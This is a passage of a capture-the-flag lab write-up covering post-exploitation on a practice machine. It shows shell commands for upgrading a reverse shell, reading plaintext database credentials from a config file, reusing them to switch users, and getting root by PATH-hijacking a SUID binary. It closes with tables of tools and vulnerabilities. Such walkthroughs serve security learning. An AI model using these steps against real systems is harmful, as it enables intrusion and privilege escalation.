Received connection as **www-data**.

Upgraded to interactive shell:
```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## 5. Lateral Movement

Found database credentials in config file:
```bash
cat /var/www/html/cdn-cgi/login/db.php
```

Output:
```php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
```

Switched to robert:
```bash
su robert
# Password: M3g4C0rpUs3r!
```

Retrieved user flag:
```bash
cat /home/robert/user.txt
```

---

## 6. Privilege Escalation

Found SUID binary owned by root:
```bash
find / -group bugtracker 2>/dev/null
# /usr/bin/bugtracker

ls -la /usr/bin/bugtracker
# -rwsr-xr-- 1 root bugtracker
```

Analyzed the binary:
```bash
strings /usr/bin/bugtracker
```

Found that it calls `cat` without an absolute path.
Exploited via PATH hijacking:
```bash
cd /tmp
echo '/bin/bash' > cat
chmod +x cat
export PATH=/tmp:$PATH
/usr/bin/bugtracker
```

Obtained root shell.

Retrieved root flag:
```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
cat /root/root.txt
```

---

## 7. Flags

- user.txt ✅
- root.txt ✅

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port and service enumeration |
| Gobuster | Directory enumeration |
| Burp Suite / DevTools | Cookie manipulation |
| php-reverse-shell | Remote code execution |
| netcat | Reverse shell listener |
| strings | Binary analysis |

---

## Vulnerabilities Found

| Vulnerability | Description |
|--------------|-------------|
| IDOR | Access ID enumeration via URL parameter |
| Broken Access Control | Cookie manipulation to gain admin access |
| Unrestricted File Upload | PHP shell uploaded and executed |
| Insecure SUID Binary | PATH hijacking via relative command call |
